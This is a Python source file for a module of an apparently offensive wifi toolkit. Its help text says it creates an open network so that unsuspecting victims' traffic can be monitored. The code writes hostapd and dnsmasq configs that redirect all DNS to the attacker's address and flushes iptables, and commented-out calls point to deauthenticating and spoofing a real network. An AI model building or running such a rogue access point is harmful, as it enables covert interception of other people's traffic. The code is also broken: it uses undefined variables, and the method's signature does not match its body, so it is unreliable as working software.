import os

class access_point():

    def __init__(self):
        self.req_var = True
        self.opt_var = False
        self.req_variables = ["-i","-n","-b"]

    def help(self):
        hlp = (
            "\nDescription:\n"
            "############\n"
            "\nCommand will create an open wifi network in which unsuspecting\n"
            " victims traffic will me monitored.\n"
            "\nUsage:\n"
            "############\n"
            "\n'access-point -i <interface> -b <interface to bridge> -n <name of network>'\n"
        )

        return hlp

    def access_point(self, iface,):
        if "-s" in var and "-i" in var and "-c" in var:
            try:
                #self.start_server()
                #self.deauthnet(var["-i"], var["-s"])
                self.createAP(var["-s"], var["-i"], var["-c"])

            except Exception:
                error = []
                error.append("1")
                error.append("Cannot spoof the network " + "'" + var["-s"] + "'")
                return error

        os.system("sudo ifconfig " + iface + " 10.0.0.1 netmask 255.255.255.0")
        # editing config file for ap settings
        ap_confile = open("hostapd.conf", "w")
        config = (
            "interface=" + iface + "\n"
            "ssid=" + ssid + "\n"
            "driver=nl80211\n"
            "ignore_broadcast_ssid=0\n"
            "channel=" + channel + "\n"
            "hw_mode=g\n"
            "auth_algs=1\n"
            "macaddr_acl=0\n"
            "wpa_pairwise=TKIP CCMP\n"
            "rsn_pairwise=CCMP\n"
        )
        ap_confile.write(config)
        ap_confile.close()

        dhcp_confile = open("/etc/dnsmasq.conf", "a")
        config = (
            "interface=" + iface + "\n"
            "address=/#/10.0.0.1\n"
            "dhcp-range=10.0.0.2,10.0.0.250,12h\n"
            "no-hosts\n"

        )
        dhcp_confile.write(config)
        dhcp_confile.close()
        os.system("sudo iptables -F")


        try:
            # start start AP and dhcp
            os.system("sudo rfkill unblock all")
            os.system("sudo service dnsmasq restart")
            #os.system("sudo service hostapd start")
            os.system("sudo hostapd -dd hostapd.conf")
        except KeyboardInterrupt:
            os.system("sudo service dnsmasq stop")
            os.system("sudo service hostapd stop")
            self.closenetspoof()